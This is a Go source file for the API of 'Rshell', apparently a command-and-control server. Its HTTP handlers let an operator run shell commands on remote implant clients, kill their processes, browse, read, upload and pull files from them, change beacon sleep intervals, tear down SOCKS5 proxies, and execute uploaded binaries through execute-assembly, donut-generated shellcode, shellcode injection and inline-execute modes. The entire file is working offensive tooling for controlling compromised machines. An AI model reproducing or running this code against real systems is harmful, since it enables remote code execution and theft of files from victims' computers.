package api

import (
	"Rshell/pkg/command"
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/logger"
	"Rshell/pkg/proxy"
	"Rshell/pkg/response"
	"Rshell/pkg/sendcommand"
	"Rshell/pkg/utils"
	"context"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// @Summary Get all connected clients
// @Tags Clients
// @Accept json
// @Produce json
// @Param page query int false "Page number"
// @Param page_size query int false "Page size"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients [get]
// @Security BearerAuth
func GetClients(c *gin.Context) {
	var clientGet struct {
		Page     int `form:"page"`
		PageSize int `form:"page_size"`
	}
	if err := c.ShouldBindQuery(&clientGet); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var clientData []database.Clients
	database.Engine.Find(&clientData)
	clientData2 := utils.Paginate(clientData, clientGet.Page, clientGet.PageSize)
	response.OK(c, gin.H{
		"list":  clientData2,
		"total": len(clientData),
	})
}
// @Summary Send a shell command to a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param command body object true "Command to execute"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/shell/commands [post]
// @Security BearerAuth
func SendCommands(c *gin.Context) {
	uid := c.Param("uid")
	var commands struct {
		Command string `json:"command"`
	}
	if err := c.ShouldBindJSON(&commands); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + commands.Command + "\n"
	database.Engine.Where("uid = ?", uid).Update(&shellHistory)

	sendcommand.SendCommand(uid, commands.Command)

	response.OK(c, shellHistory.ShellContent)
}

// @Summary Get shell output from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/shell/output [get]
// @Security BearerAuth
func GetShellContent(c *gin.Context) {
	uid := c.Param("uid")
	var shell database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shell)
	response.OK(c, shell.ShellContent)
}
// @Summary Get process list from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/processes [get]
// @Security BearerAuth
func GetPidList(c *gin.Context) {
	uid := c.Param("uid")
	// 创建 UID 对应的通道队列
	queue := command.VarPidQueue.GetOrCreateQueue(uid)

	sendcommand.SendCommand(uid, "ps")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case pids := <-queue:
		pidStruct := utils.ParsePid(pids)
		response.OK(c, pidStruct)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
// @Summary Kill a process on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param pid path string true "Process ID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/processes/{pid} [delete]
// @Security BearerAuth
func KillPid(c *gin.Context) {
	uid := c.Param("uid")
	pid := c.Param("pid")
	sendcommand.SendCommand(uid, "kill "+pid)
	response.OK(c, "killed")
}
// @Summary Browse files on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param dirPath query string true "Directory path to browse"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files [get]
// @Security BearerAuth
func FileBrowse(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		DirPath string `form:"dirPath"`
	}
	if err := c.ShouldBindQuery(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	if fileBody.DirPath == "" {
		response.BadRequest(c, "dirPath is empty")
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)
	if strings.HasSuffix(fileBody.DirPath, ":") {
		fileBody.DirPath += "/"
	}
	//fmt.Println("dirPath:", fileBody.DirPath)
	sendcommand.SendCommand(uid, "filebrowse "+fileBody.DirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}

}
// @Summary Delete a file on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath query string true "File path to delete"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files [delete]
// @Security BearerAuth
func FileDelete(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		FilePath string `form:"filePath"`
	}
	if err := c.ShouldBindQuery(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(fileBody.FilePath, "/")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
// @Summary Create a directory on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param dirPath body object true "Directory path to create"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files/directories [post]
// @Security BearerAuth
func MakeDir(c *gin.Context) {
	uid := c.Param("uid")
	var dirBody struct {
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&dirBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(dirBody.DirPath, "/")
	if lastSlashIndex != -1 {
		dirPath = dirBody.DirPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
// @Summary Upload a file to a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "File to upload"
// @Param uploadPath formData string true "Upload destination path"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/files/upload [post]
// @Security BearerAuth
func FileUpload(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.InternalError(c)
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.InternalError(c)
		return
	}

	// 获取其他表单字段
	uid := c.Param("uid")
	uploadPath := c.PostForm("uploadPath")

	uploadPathBytes := []byte(uploadPath)
	uploadPathLen := len(uploadPathBytes)
	uploadPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(uploadPathLenBytes, uint32(uploadPathLen))
	fileBytesArray := utils.SplitByteArray(fileBytes, 1040500)
	go func() {
		if len(fileBytesArray) == 0 {
			return
		}
		cmd := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, fileBytesArray[0])
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UploadStart))
		byteToSend := append(cmdTypeBytes, cmd...)
		sendcommand.SendCommandBytes(uid, byteToSend)

		for _, filebytes := range fileBytesArray[1:] {
			cmdLoop := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, filebytes)
			cmdTypeBytesLoop := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytesLoop, uint32(command.UploadLoop))
			byteToSendLoop := append(cmdTypeBytesLoop, cmdLoop...)
			sendcommand.SendCommandBytes(uid, byteToSendLoop)
		}
	}()
	response.OK(c, nil)
}
// @Summary Get note for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [get]
// @Security BearerAuth
func GetNote(c *gin.Context) {
	uid := c.Param("uid")
	var Note database.Notes
	database.Engine.Where("uid = ?", uid).Get(&Note)
	response.OK(c, Note.Note)
}
// @Summary Save note for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param noteContent body object true "Note content to save"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [put]
// @Security BearerAuth
func SaveNote(c *gin.Context) {
	uid := c.Param("uid")
	var noteBody struct {
		NoteContent string `json:"noteContent"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var Note database.Notes
	database.Engine.Where("uid = ?", uid).Get(&Note)
	Note.Note = noteBody.NoteContent
	database.Engine.Where("uid = ?", uid).Update(&Note)
	response.OK(c, nil)
}
// @Summary Request a file download from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath body object true "File path to download"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/files/download [post]
// @Security BearerAuth
func DownloadFile(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		FilePath string `json:"filePath"`
	}

	if err := c.ShouldBindJSON(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	// 验证输入参数
	if fileBody.FilePath == "" {
		response.BadRequest(c, "UID and file path are required")
		return
	}

	// 验证 UID 格式
	if strings.Contains(uid, "..") || strings.Contains(uid, "/") || strings.Contains(uid, "\\") {
		response.BadRequest(c, "Invalid UID format")
		return
	}

	// 验证文件路径基本安全性
	if fileBody.FilePath == "" || fileBody.FilePath == "." || fileBody.FilePath == ".." {
		response.BadRequest(c, "Invalid file path")
		return
	}

	// 使用安全路径创建下载目录
	downloadDir := filepath.Join("./Downloads", uid)

	// 确保下载目录存在
	if err := os.MkdirAll(downloadDir, 0755); err != nil {
		logger.Error("Failed to create download directory: %v", err)
		response.InternalError(c)
		return
	}

	// 获取安全的文件名用于数据库存储
	safeFileName := filepath.Base(fileBody.FilePath)
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	if safeFileName == "" {
		response.BadRequest(c, "Invalid file name")
		return
	}

	// 数据库操作
	var fileDownloads database.Downloads
	exist, err := database.Engine.Where("uid = ? AND file_path = ?", uid, fileBody.FilePath).Get(&fileDownloads)
	if err != nil {
		logger.Error("Database query failed: %v", err)
		response.InternalError(c)
		return
	}

	if !exist {
		// 插入新记录
		downloadRecord := &database.Downloads{
			Uid:            uid,
			FileName:       safeFileName,
			FilePath:       fileBody.FilePath,
			FileSize:       0,
			DownloadedSize: 0,
		}
		if _, err := database.Engine.Insert(downloadRecord); err != nil {
			logger.Error("Failed to insert download record: %v", err)
			response.InternalError(c)
			return
		}
	} else {
		// 更新现有记录
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		_, err := database.Engine.Exec(sql, 0, 0, uid, fileBody.FilePath)
		if err != nil {
			logger.Error("Failed to update download record: %v", err)
			response.InternalError(c)
			return
		}
	}

	// 发送下载命令
	sendcommand.SendCommand(uid, "download "+fileBody.FilePath)
	response.OK(c, nil)
}

type DownloadsInfo struct {
	FileName       string `json:"fileName"`
	FilePath       string `json:"filePath"`
	FileSize       string `json:"fileSize"`
	DownloadedPart string `json:"downloadPart"`
}

// @Summary Get download status for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/downloads [get]
// @Security BearerAuth
func GetDownloadsInfo(c *gin.Context) {
	uid := c.Param("uid")
	var downloads []database.Downloads
	database.Engine.Where("uid = ?", uid).Find(&downloads)
	var result []DownloadsInfo
	for _, download := range downloads {
		var tmpDownloadsInfo DownloadsInfo
		tmpDownloadsInfo.FileName = download.FileName
		tmpDownloadsInfo.FilePath = download.FilePath
		tmpDownloadsInfo.FileSize = utils.BytesToSize(strconv.Itoa(download.FileSize))
		if download.FileSize != 0 {
			tmpDownloadsInfo.DownloadedPart = strconv.Itoa(download.DownloadedSize * 100 / download.FileSize)
		} else {
			tmpDownloadsInfo.DownloadedPart = "0"
		}

		result = append(result, tmpDownloadsInfo)
	}
	response.OK(c, result)
}
// @Summary Fetch a downloaded file from the server
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath body object true "File path to fetch"
// @Success 200 {file} binary "File content"
// @Failure 400 {object} object "bad request"
// @Failure 404 {object} object "file not found"
// @Router /api/v1/clients/{uid}/downloads/fetch [post]
// @Security BearerAuth
func DownloadDownloadedFile(c *gin.Context) {
	uid := c.Param("uid")
	var downloadBody struct {
		FilePath string `json:"filePath"`
	}

	if err := c.ShouldBindJSON(&downloadBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	// 使用通用的安全路径函数验证文件路径
	fullPath, err := utils.GetSafeFilePath(uid, downloadBody.FilePath)
	if err != nil {
		response.BadRequest(c, "Invalid file path")
		return
	}

	// 检查文件是否存在
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		response.NotFound(c, "File not found")
		return
	}

	// 获取安全的文件名用于下载
	safeFileName := filepath.Base(downloadBody.FilePath)
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	// 设置响应头
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+safeFileName)
	c.Header("Content-Type", "application/octet-stream")

	// 发送文件
	c.File(fullPath)
}
// @Summary List drives on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/drives [get]
// @Security BearerAuth
func ListDrives(c *gin.Context) {
	uid := c.Param("uid")

	queue := command.VarDrivesQueue.GetOrCreateQueue(uid)

	sendcommand.SendCommand(uid, "drives")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		//fmt.Println("fileBrowseStr", fileBrowseStr)
		fileTree := command.ParseDrives(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
// @Summary Fetch content of a file on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param path query string true "File path to read"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files/content [get]
// @Security BearerAuth
func FetchFileContent(c *gin.Context) {
	uid := c.Param("uid")
	var contentBody struct {
		FilePath string `form:"path"`
	}
	if err := c.ShouldBindQuery(&contentBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileContentQueue.GetOrCreateQueue(uid, contentBody.FilePath)

	sendcommand.SendCommand(uid, "filecontent "+contentBody.FilePath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileContent := <-queue:
		response.OK(c, fileContent)
	case <-ctx.Done():
		response.Timeout(c)
	}

}
// @Summary Disconnect and remove a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid} [delete]
// @Security BearerAuth
func ExitClient(c *gin.Context) {
	uid := c.Param("uid")
	sendcommand.SendCommand(uid, "exit")

	go func() {
		var client database.Clients
		database.Engine.Where("uid = ?", uid).Get(&client)
		duration, _ := time.ParseDuration(client.Sleep + "s")
		time.Sleep(duration)
		database.Engine.Where("uid = ?", uid).Delete(new(database.Clients))
		database.Engine.Where("uid = ?", uid).Delete(new(database.Downloads))
		database.Engine.Where("uid = ?", uid).Delete(new(database.Notes))
		database.Engine.Where("uid = ?", uid).Delete(new(database.Shell))
		var socks5 []database.Socks5
		database.Engine.Where("uid = ?", uid).Find(&socks5)
		for _, socks5i := range socks5 {
			if _, exists := proxy.Socks5Serve[socks5i.Socks5port]; exists {
				err := proxy.Socks5Serve[socks5i.Socks5port].Close()
				proxy.MuSocks5Serve.Lock()
				delete(proxy.Socks5Serve, socks5i.Socks5port)
				proxy.MuSocks5Serve.Unlock()
				if err != nil {
					logger.Error("Socks5 closed failed for uid %s", uid)
					return
				}
			}
		}
		database.Engine.Where("uid = ?", uid).Delete(new(database.Socks5))
		delete(command.UidFileBrowser, uid)
	}()

	response.OK(c, nil)
}
// @Summary Add a note to a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param note body object true "Note text"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [post]
// @Security BearerAuth
func AddUidNote(c *gin.Context) {
	uid := c.Param("uid")
	var noteBody struct {
		Note string `json:"note"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Note: noteBody.Note})
	response.OK(c, nil)
}
// @Summary Edit client sleep interval
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param sleep body object true "Sleep interval in seconds"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/sleep [put]
// @Security BearerAuth
func EditSleep(c *gin.Context) {
	uid := c.Param("uid")
	var sleepBody struct {
		Sleep string `json:"sleep"`
	}
	if err := c.ShouldBindJSON(&sleepBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
	sendcommand.SendCommand(uid, "sleep "+sleepBody.Sleep)
	response.OK(c, nil)
}
// @Summary Edit client display color
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param color body object true "Color value"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/color [put]
// @Security BearerAuth
func EditColor(c *gin.Context) {
	uid := c.Param("uid")
	var colorBody struct {
		Color string `json:"color"`
	}
	if err := c.ShouldBindJSON(&colorBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Color: colorBody.Color})
	response.OK(c, nil)
}
// @Summary Execute binary on a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "Binary file to execute"
// @Param args formData string false "Arguments"
// @Param mode formData string true "Execution mode (execute-assembly|inline-bin|shellcode-inject|inline-execute)"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/execute [post]
// @Security BearerAuth
func ExecuteBin(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.Param("uid")
	args := c.PostForm("args")
	mode := c.PostForm("mode")

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + mode + " " + file.Filename + " " + args + "\n"
	database.Engine.Where("uid = ?", uid).Update(&shellHistory)

	switch mode {
	case "execute-assembly":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-bin":
		var u database.Clients
		database.Engine.Where("uid = ?", uid).Get(&u)

		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
		if err != nil {
			response.BadRequest(c, "Unable to generate shellcode")
			return
		}
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "shellcode-inject":
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-execute":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	}
	response.OK(c, nil)
}

// @Summary Execute Linux script on a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "Script file to execute"
// @Param args formData string false "Arguments"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/execute-linux-script [post]
// @Security BearerAuth
func ExecuteLinuxScript(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.Param("uid")
	args := c.PostForm("args")

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + "execute-linux-sh " + file.Filename + " " + args + "\n"
	database.Engine.Where("uid = ?", uid).Update(&shellHistory)

	// 获取客户端信息以检查操作系统架构
	// var client database.Clients
	// database.Engine.Where("uid = ?", uid).Get(&client)

	// 检查客户端操作系统是否为Windows
	// if client.Os == "Windows" || client.Os == "windows" {
	// 	// Windows客户端返回不支持消息
	// 	unsupportedMsg := "[!] 当前客户端为Windows架构，不支持Linux脚本执行\n"
	// 	shellHistory.ShellContent = shellHistory.ShellContent + unsupportedMsg
	// 	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
	// 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	// 	return
	// }

	// 构建脚本内容消息
	fileLength := len(fileBytes)
	fileLengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
	byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
	byteToSend = append(cmdTypeBytes, byteToSend...)
	sendcommand.SendCommandBytes(uid, byteToSend)

	response.OK(c, nil)
}
